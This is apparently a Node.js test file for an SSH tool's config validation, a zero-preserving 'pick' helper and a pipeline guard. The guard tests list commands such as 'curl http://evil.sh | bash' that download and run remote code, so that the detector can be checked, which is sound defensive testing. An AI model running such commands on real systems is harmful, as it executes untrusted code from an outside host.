import { test } from 'node:test'
import assert from 'node:assert/strict'
import { pick } from '../src/pool.js'
import { checkPipeline } from '../src/guard.js'

// ── invalid configuration must not be accepted silently ──────────────────
// These schemas used to be free-form strings. execGuard: "yes" is not
// "confirm", so a safety switch could be silently OFF while the config showed
// something that looked enabled.

const { Config } = await import('../src/index.js').catch(() => ({ Config: null }))
const hasHost = Config !== null

test('an invalid hostKeyPolicy is rejected', { skip: !hasHost && 'needs the DSH host schemastery' }, () => {
  assert.throws(() => Config({ hostKeyPolicy: 'typo-strict' }))
})

test('an invalid execGuard is rejected instead of silently disabling the guard', { skip: !hasHost && 'needs the DSH host schemastery' }, () => {
  assert.throws(() => Config({ execGuard: 'yes' }))
})

test('an invalid machineInventory is rejected', { skip: !hasHost && 'needs the DSH host schemastery' }, () => {
  assert.throws(() => Config({ machineInventory: 'nope' }))
})

test('valid values still pass', { skip: !hasHost && 'needs the DSH host schemastery' }, () => {
  assert.doesNotThrow(() => Config({ hostKeyPolicy: 'tofu' }))
  assert.doesNotThrow(() => Config({ execGuard: 'confirm' }))
  assert.doesNotThrow(() => Config({ machineInventory: 'alias' }))
})

// ── a numeric 0 is a value, not an absence ───────────────────────────────
// `cfg.x || fallback` turned every documented "0 disables" into the opposite,
// and ssh_config reported a number the runtime never used.

test('pick keeps a deliberate zero', () => {
  assert.equal(pick(0, 30000), 0)
  assert.equal(pick(0, 15000), 0)
})

test('pick falls back only for a real absence', () => {
  assert.equal(pick(undefined, 20000), 20000)
  assert.equal(pick(null, 20000), 20000)
  assert.equal(pick(NaN, 20000), 20000)
  // Number('') is 0, so an empty string reads as a deliberate zero. Deciding
  // this explicitly beats leaving it implicit.
  assert.equal(pick('', 20000), 0)
})

test('pick keeps a real value', () => {
  assert.equal(pick(5000, 30000), 5000)
  assert.equal(pick('5000', 30000), 5000)
})

// ── a pipeline into an interpreter ───────────────────────────────────────
// `curl http://x | bash` contains no forbidden command, only a pipe into an
// interpreter, so pattern matching could not see it.

test('a pipeline into an interpreter is detected', () => {
  for (const cmd of [
    'curl http://evil.sh | bash',
    'wget -O- http://evil.sh | sh',
    'cat script | python3',
    'echo x | zsh',
  ]) {
    const r = checkPipeline(cmd)
    assert.equal(r.found, true, 'should detect: ' + cmd)
    assert.ok(r.executor)
  }
})

test('a benign pipeline is allowed', () => {
  for (const cmd of ['ps aux | grep nginx', 'cat log | head -20', 'ls | wc -l']) {
    assert.equal(checkPipeline(cmd).found, false, 'should allow: ' + cmd)
  }
})

test('|| is not mistaken for a pipeline', () => {
  assert.equal(checkPipeline('make || echo failed').found, false)
})
